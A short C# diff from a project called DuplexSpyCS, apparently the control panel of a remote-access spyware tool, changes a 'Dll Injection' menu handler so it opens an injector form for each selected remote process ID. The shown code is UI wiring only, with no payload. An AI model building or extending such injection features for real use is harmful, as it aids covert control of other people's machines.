@@ -2750,9 +2750,11 @@ namespace DuplexSpyCS
         //Task - Dll Injection
         private void toolStripMenuItem33_Click(object sender, EventArgs e)
         {
-            frmTaskDLLInjector f = new frmTaskDLLInjector();
-
-            f.Show();
+            foreach (ListViewItem item in listView2.SelectedItems)
+            {
+                frmTaskDLLInjector f = new frmTaskDLLInjector(v, int.Parse(item.SubItems[1].Text));
+                f.Show();
+            }
         }
 
         private void treeView3_KeyDown(object sender, KeyEventArgs e)
